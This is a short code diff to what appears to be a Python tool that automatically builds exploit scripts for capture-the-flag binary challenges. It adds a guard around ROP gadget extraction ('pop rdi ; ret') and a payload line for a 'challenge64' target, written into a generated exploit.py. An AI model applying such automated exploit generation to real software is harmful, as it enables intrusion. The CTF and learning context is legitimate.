@@ -1749,7 +1749,8 @@ while True:
          catsFile("gadgets.tmp")                
          command("cat gadgets.tmp | grep 'pop rdi ; ret' > pop.tmp")        
          check = linecache.getline("pop.tmp", 1)
-         REG2[10] = check.split(" ")[0].rstrip(" ")
+         if check != "":
+            REG2[10] = check.split(" ")[0].rstrip(" ")
          command("mv gadgets.tmp " + localDir + "/gadgets.txt")
          gadgFile = localDir + "/gadgets.txt"
          cutLine("Gadgets information", gadgFile)
@@ -2438,7 +2439,12 @@ while True:
             command("echo 'flag = s.recv()' >> " + localDir + "/exploit.py")
             command("echo 'print(terminater, flag)' >> " + localDir + "/exploit.py")
             command("echo 'exit(1)' >> " + localDir + "/exploit.py")
-            command("echo '' >> " + localDir + "/exploit.py") # SPACER                          
+            command("echo '' >> " + localDir + "/exploit.py") # SPACER   
+            
+         if DATA[0][:11] == "challenge64":
+            command("echo 'payload = flat(padding,jumpto,terminater)' >> " + localDir + "/exploit.py")
+            command("echo '# print(payload)' >> " + localDir + "/exploit.py")         
+            command("echo '' >> " + localDir + "/exploit.py") # SPACER                                       
             
 # ADD YOUR BESPOKE PAYLOADS HERE     
          command("echo 'try:' >> " + localDir + "/exploit.py")
